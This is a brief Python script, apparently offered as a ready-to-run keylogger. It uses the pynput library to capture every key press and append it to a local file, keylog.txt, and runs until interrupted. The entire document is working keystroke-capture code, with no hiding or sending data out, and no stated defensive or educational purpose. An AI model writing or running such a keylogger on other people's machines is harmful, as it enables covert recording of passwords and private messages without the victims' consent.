from pynput import keyboard

def log_keystroke(key):
    try:
        with open("keylog.txt", "a") as file:
            if hasattr(key, 'char') and key.char is not None:
                file.write(key.char)
            elif key == keyboard.Key.space:
                file.write(" ")
            else:
                file.write(f"[{key}]")
    except Exception as e:
        print(f"Error logging key: {e}")

def main():
    print("Keylogger running... Press Ctrl+C to stop.")
    with keyboard.Listener(on_press=log_keystroke) as listener:
        listener.join()

if __name__ == "__main__":
    main()
